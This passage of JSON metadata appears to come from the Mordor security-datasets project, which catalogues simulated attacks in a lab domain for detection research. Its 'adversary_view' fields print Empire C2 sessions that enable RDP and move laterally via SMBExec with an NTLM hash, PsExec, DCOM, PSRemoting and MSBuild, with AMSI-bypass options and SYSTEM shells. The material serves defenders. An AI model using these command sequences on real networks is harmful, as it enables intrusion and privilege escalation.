                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "datasets": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_enable_rdp.tar.gz"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "management",
                    "script": "https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: TKV35P8X) > usemodule management/enable_rdp*           \n(Empire: powershell/management/enable_rdp) > info\n\n              Name: Enable-RDP\n            Module: powershell/management/enable_rdp\n        NeedsAdmin: True\n        OpsecSafe: False\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @harmj0y\n\nDescription:\n  Enables RDP on the remote machine and adds a firewall\n  exception.\n\nOptions:\n\n  Name  Required    Value                     Description\n  ----  --------    -------                   -----------\n  Agent True        TKV35P8X                  Agent to run module on.                 \n\n(Empire: powershell/management/enable_rdp) > execute\n[>] Module is not opsec safe, run? [y/N] y\n[*] Tasked TKV35P8X to run TASK_CMD_WAIT\n[*] Agent TKV35P8X tasked with task ID 21\n[*] Tasked agent TKV35P8X to run module powershell/management/enable_rdp\n(Empire: powershell/management/enable_rdp) > The operation completed successfully.\n(Empire: powershell/management/enable_rdp) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:31.914297+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518210125.yaml": {
        "title": "Empire Invoke SMBExec",
        "id": "SDWIN-190518210125",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "RPC CreateService",
            "RPC StartService",
            "SMB Svcctl"
        ],
        "description": "This dataset represents adversaries remotely creating and starting a service via RPC methods over SMB named pipes such as svcctl.",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "002",
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_smbexec_dcerpc_smb_svcctl.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_smbexec_dcerpc_smb_svcctl.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "invoke_smbexec",
                    "script": "https://github.com/EmpireProject/Empire/blob/dev/data/module_source/lateral_movement/Invoke-SMBExec.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: 7ADX8ZVR) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n7ADX8ZVR ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         8948   5/0.0    2020-09-20 06:34:21  http            \n\n\n(Empire: agents) > interact 7ADX8ZVR\n(Empire: 7ADX8ZVR) > usemodule lateral_movement/invoke_smbexec\n(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash 81d310fa34e6a56a31145445891bb7b8\n(Empire: powershell/lateral_movement/invoke_smbexec) > set Username pgustavo\n(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain theshire\n(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName WORKSTATION6.theshire.local\n(Empire: powershell/lateral_movement/invoke_smbexec) > set Listener http\n(Empire: powershell/lateral_movement/invoke_smbexec) > info\n\n              Name: Invoke-SMBExec\n            Module: powershell/lateral_movement/invoke_smbexec\n        NeedsAdmin: False\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @rvrsh3ll\n\nDescription:\n  Executes a stager on remote hosts using SMBExec.ps1. This\n  module requires a username and NTLM hash\n\nComments:\n  https://raw.githubusercontent.com/Kevin-Robertson/Invoke-\n  TheHash/master/Invoke-SMBExec.ps1\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        7ADX8ZVR                  Agent to run module on.                 \n  CredID           False                                 CredID from the store to use.           \n  ComputerName     True        WORKSTATION6.theshire.lo  Host[s] to execute the stager on, comma \n                              cal                       separated.                              \n  Username         True        pgustavo                  Username.                               \n  Domain           False       theshire                  Domain.                                 \n  Hash             True        81d310fa34e6a56a31145445  NTLM Hash in LM:NTLM or NTLM format.    \n                              891bb7b8                \n  Service          False                                 Name of service to create and delete.   \n                                                        Defaults to 20 char random.             \n  Listener         False       http                      Listener to use.                        \n  Command          False                                 Custom command to run.                  \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n\n(Empire: powershell/lateral_movement/invoke_smbexec) > execute\n[*] Tasked 7ADX8ZVR to run TASK_CMD_WAIT\n[*] Agent 7ADX8ZVR tasked with task ID 3\n[*] Tasked agent 7ADX8ZVR to run module powershell/lateral_movement/invoke_smbexec\n(Empire: powershell/lateral_movement/invoke_smbexec) > \nCommand executed with service PGUJLOAKFQFVOMHGFQPX on WORKSTATION6.theshire.local\n\n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n[*] New agent 3KL8YRUB checked in\n[+] Initial agent 3KL8YRUB from 172.18.39.6 now active (Slack)\n[*] Sending agent (stage 2) to 3KL8YRUB at 172.18.39.6\n\n(Empire: powershell/lateral_movement/invoke_smbexec) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n7ADX8ZVR ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         8948   5/0.0    2020-09-20 06:57:53  http            \n\n3KL8YRUB ps 172.18.39.6     WORKSTATION6      *THESHIRE\\SYSTEM        powershell         1152   5/0.0    2020-09-20 06:57:49  http            \n\n(Empire: agents) > interact 3KL8YRUB\n(Empire: 3KL8YRUB) > shell whoami\n[*] Tasked 3KL8YRUB to run TASK_SHELL\n[*] Agent 3KL8YRUB tasked with task ID 1\n(Empire: 3KL8YRUB) > \nnt authority\\system\n\n..Command execution completed.\n\n(Empire: 3KL8YRUB) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:32.093296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518210652.yaml": {
        "title": "Empire Invoke PsExec",
        "id": "SDWIN-190518210652",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "RPC CreateService",
            "RPC StartService",
            "TCP Svcctl"
        ],
        "description": "This dataset represents adversaries remotely creating and starting a service via RPC methods over TCP.",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": null,
                "tactics": [
                    "TA0002",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_psexec_dcerpc_tcp_svcctl.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_psexec_dcerpc_tcp_svcctl.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "lateral_movement",
                    "script": "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: stager/multi/launcher) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 16:13:06  http            \n\n\n(Empire: agents) > interact UF5MYK42\n(Empire: UF5MYK42) > usemodule lateral_movement/invoke_psexec\n(Empire: powershell/lateral_movement/invoke_psexec) > set Listener http\n(Empire: powershell/lateral_movement/invoke_psexec) > execute\n(Empire: powershell/lateral_movement/invoke_psexec) > set ComputerName WORKSTATION6.theshire.local\n(Empire: powershell/lateral_movement/invoke_psexec) > info\n\n              Name: Invoke-PsExec\n            Module: powershell/lateral_movement/invoke_psexec\n        NeedsAdmin: False\n        OpsecSafe: False\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n  OutputExtension: None\n\nAuthors:\n  @harmj0y\n\nDescription:\n  Executes a stager on remote hosts using PsExec type\n  functionality.\n\nComments:\n  https://github.com/rapid7/metasploit-\n  framework/blob/master/tools/psexec.rb\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        UF5MYK42                  Agent to run module on.                 \n  Listener         False                                 Listener to use.                        \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  ComputerName     True        ComputerName WORKSTATION6.theshire.local Host to execute the stager on.          \n  ServiceName      True        Updater                   The name of the service to create.      \n  Command          False                                 Custom command to execute on remote     \n                                                        hosts.                                  \n  ResultFile       False                                 Name of the file to write the results to\n                                                        on agent machine.                       \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n\n(Empire: powershell/lateral_movement/invoke_psexec) > execute\n[>] Module is not opsec safe, run? [y/N] y\n[*] Tasked UF5MYK42 to run TASK_CMD_JOB\n[*] Agent UF5MYK42 tasked with task ID 1\n[*] Tasked agent UF5MYK42 to run module powershell/lateral_movement/invoke_psexec\n(Empire: powershell/lateral_movement/invoke_psexec) > \nJob started: RNU5DY\n\n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n\n[*] New agent 9CMNYX72 checked in\n[+] Initial agent 9CMNYX72 from 172.18.39.6 now active (Slack)\n[*] Sending agent (stage 2) to 9CMNYX72 at 172.18.39.6\n\n(Empire: powershell/lateral_movement/invoke_psexec) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 16:17:06  http            \n\n9CMNYX72 ps 172.18.39.6     WORKSTATION6      *THESHIRE\\SYSTEM        powershell         4312   5/0.0    2020-09-20 16:17:08  http            \n\n(Empire: agents) > interact 9CMNYX72\n(Empire: 9CMNYX72) > shell whoami\n[*] Tasked 9CMNYX72 to run TASK_SHELL\n[*] Agent 9CMNYX72 tasked with task ID 1\n(Empire: 9CMNYX72) > \nnt authority\\system\n\n..Command execution completed.\n\n(Empire: 9CMNYX72) > back"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:32.269298+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518211052.yaml": {
        "title": "Empire Invoke DCOM ShellWindows",
        "id": "SDWIN-190518211052",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/18",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "DCOM ShellWindows"
        ],
        "description": "This dataset represents adversaries executing commands remotely via DCOM ShellWindows COM Method.",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "003",
                "tactics": [
                    "TA0002",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_dcom_shellwindows_stager.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_dcom_shellwindows_stager.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "lateral_movement",
                    "script": "https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: agents) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 17:07:59  http            \n\n(Empire: agents) > interact A7BWPR32\n(Empire: A7BWPR32) > usemodule lusemodule lateral_movement/invoke_dcom\n(Empire: powershell/lateral_movement/invoke_dcom) > info\n\n              Name: Invoke-DCOM\n            Module: powershell/lateral_movement/invoke_dcom\n        NeedsAdmin: False\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @rvrsh3ll\n\nDescription:\n  Execute a stager or command on remote hosts using DCOM.\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        A7BWPR32                  Agent to run module on.                 \n  CredID           False                                 CredID from the store to use.           \n  ComputerName     True        WORKSTATION6              Host[s] to execute the stager on, comma \n                                                        separated.                              \n  Method           True        ShellWindows              COM method to use. MMC20.Application,She\n                                                        llWindows,ShellBrowserWindow,ExcelDDE   \n  Listener         False       http                      Listener to use.                        \n  Command          False                                 Custom command to run.                  \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n\n(Empire: powershell/lateral_movement/invoke_dcom) > execute\n[*] Tasked A7BWPR32 to run TASK_CMD_WAIT\n[*] Agent A7BWPR32 tasked with task ID 6\n[*] Tasked agent A7BWPR32 to run module powershell/lateral_movement/invoke_dcom\n(Empire: powershell/lateral_movement/invoke_dcom) > \nCompleted\n\n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n[*] New agent HBEW9G1D checked in\n[+] Initial agent HBEW9G1D from 172.18.39.6 now active (Slack)\n[*] Sending agent (stage 2) to HBEW9G1D at 172.18.39.6\n\n(Empire: powershell/lateral_movement/invoke_dcom) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 17:08:46  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 17:08:47  http            \n\n(Empire: agents) > interact HBEW9G1D\n(Empire: HBEW9G1D) > shell whoami\n[*] Tasked HBEW9G1D to run TASK_SHELL\n[*] Agent HBEW9G1D tasked with task ID 1\n(Empire: HBEW9G1D) > \ntheshire\\sbeavers\n\n..Command execution completed.\n\n(Empire: HBEW9G1D) >",
            "notes": [
                "Windows Explorer must have an inbound rule to accept connections",
                "A user must be logged in (Locked enpoint does not work). I had to RDP to lab box"
            ]
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:32.447296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518211456.yaml": {
        "title": "Empire Invoke PSRemoting",
        "id": "SDWIN-190518211456",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "PowerShell Remoting"
        ],
        "description": "This dataset represents adversaries executing malicious code on remote hosts using PowerShell Remoting (WinRM).",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "006",
                "tactics": [
                    "TA0002",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_psremoting_stager.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_psremoting_stager.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "invoke_psremoting",
                    "script": "https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/lateral_movement/invoke_psremoting.py"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: agents) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:05:28  http            \n\n(Empire: agents) > interact UF5MYK42\n(Empire: UF5MYK42) > usemodule lateral_movement/invoke_psremoting\n(Empire: powershell/lateral_movement/invoke_psremoting) > set ComputerName WORKSTATION6.theshire.local\n(Empire: powershell/lateral_movement/invoke_psremoting) > set Listener http\n(Empire: powershell/lateral_movement/invoke_psremoting) > info\n\n              Name: Invoke-PSRemoting\n            Module: powershell/lateral_movement/invoke_psremoting\n        NeedsAdmin: False\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @harmj0y\n\nDescription:\n  Executes a stager on remote hosts using PSRemoting.\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        UF5MYK42                  Agent to run module on.                 \n  CredID           False                                 CredID from the store to use.           \n  ComputerName     True        WORKSTATION6.theshire.lo  Host[s] to execute the stager on, comma \n                              cal                       separated.                              \n  Listener         True        http                      Listener to use.                        \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  UserName         False                                 [domain\\]username to use to execute     \n                                                        command.                                \n  Password         False                                 Password to use to execute command.     \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n\n(Empire: powershell/lateral_movement/invoke_psremoting) > execute\n[*] Tasked UF5MYK42 to run TASK_CMD_WAIT\n[*] Agent UF5MYK42 tasked with task ID 2\n[*] Tasked agent UF5MYK42 to run module powershell/lateral_movement/invoke_psremoting\n(Empire: powershell/lateral_movement/invoke_psremoting) > \n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n[*] New agent L86DT27X checked in\n[+] Initial agent L86DT27X from 172.18.39.6 now active (Slack)\n[*] Sending agent (stage 2) to L86DT27X at 172.18.39.6\n\n(Empire: powershell/lateral_movement/invoke_psremoting) > \n(Empire: powershell/lateral_movement/invoke_psremoting) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:09:08  http            \n\nL86DT27X ps 172.18.39.6     WORKSTATION6      *THESHIRE\\pgustavo      powershell         10116  5/0.0    2020-09-20 21:09:23  http            \n\n(Empire: agents) > interact L86DT27X\n(Empire: L86DT27X) > shell whoami\n[*] Tasked L86DT27X to run TASK_SHELL\n[*] Agent L86DT27X tasked with task ID 1\n(Empire: L86DT27X) > \ntheshire\\pgustavo\n\n..Command execution completed.\n\n(Empire: L86DT27X) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:32.652296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518213907.yaml": {
        "title": "Empire Invoke Execute MSBuild",
        "id": "SDWIN-190518213907",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "WMI IWbemServices ExecMethod",
            "SMB CreateRequest"
        ],
        "description": "This dataset represents an adversary remotely creating a file (.xml) via SMB and executing it remotetly via WMI and msbuild. This dataset focuses on the use of the WMI Win32_Process class and method Create to execute code remotely.",
        "attack_mappings": [
            {
                "technique": "T1047",
                "sub-technique": null,
                "tactics": [
                    "TA0002",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_msbuild_dcerpc_wmi_smb.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_msbuild_dcerpc_wmi_smb.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "invoke_executemsbuild",
                    "script": "https://github.com/EmpireProject/Empire/blob/dev/data/module_source/lateral_movement/Invoke-ExecuteMSBuild.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: stager/multi/launcher) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            \nAWTK7BX5 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2228   5/0.0    2020-09-20 21:33:05  http            \n\n(Empire: agents) > interact AWTK7BX5  \n(Empire: AWTK7BX5) > usemodule lateral_movement/invoke_executemsbuild\n(Empire: powershell/lateral_movement/invoke_executemsbuild) > info\n\n              Name: Invoke-ExecuteMSBuild\n            Module: powershell/lateral_movement/invoke_executemsbuild\n        NeedsAdmin: False\n        OpsecSafe: False\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @xorrior\n\nDescription:\n  This module utilizes WMI and MSBuild to compile and execute\n  an xml file containing an Empire launcher\n\nComments:\n  Inspired by @subtee\n  http://subt0x10.blogspot.com/2016/09/bypassing-application-\n  whitelisting.html\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        AWTK7BX5                  Agent to run module from.               \n  Listener         False                                 Listener to use.                        \n  Command          False                                 Custom command to run.                  \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  CredID           False                                 CredID from the store to use.           \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n  ComputerName     True                                  Host to target                          \n  UserName         False                                 UserName if executing with credentials  \n  Password         False                                 Password if executing with credentials  \n  FilePath         False                                 Desired location to copy the xml file on\n                                                        the target                              \n  DriveLetter      False                                 Drive letter to use when mounting the   \n                                                        share locally                           \n\n(Empire: powershell/lateral_movement/invoke_executemsbuild) > set Listener http\n(Empire: powershell/lateral_movement/invoke_executemsbuild) > set ComputerName WORKSTATION6.theshire.local\n(Empire: powershell/lateral_movement/invoke_executemsbuild) > execute\n[>] Module is not opsec safe, run? [y/N] y\n[*] Tasked AWTK7BX5 to run TASK_CMD_WAIT\n[*] Agent AWTK7BX5 tasked with task ID 1\n[*] Tasked agent AWTK7BX5 to run module powershell/lateral_movement/invoke_executemsbuild\n(Empire: powershell/lateral_movement/invoke_executemsbuild) > \n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n[*] New agent U63RL1XZ checked in\n[+] Initial agent U63RL1XZ from 172.18.39.6 now active (Slack)\n[*] Sending agent (stage 2) to U63RL1XZ at 172.18.39.6\n\n__GENUS          : 2\n__CLASS          : __PARAMETERS\n__SUPERCLASS     : \n__DYNASTY        : __PARAMETERS\n__RELPATH        : \n__PROPERTY_COUNT : 2\n__DERIVATION     : 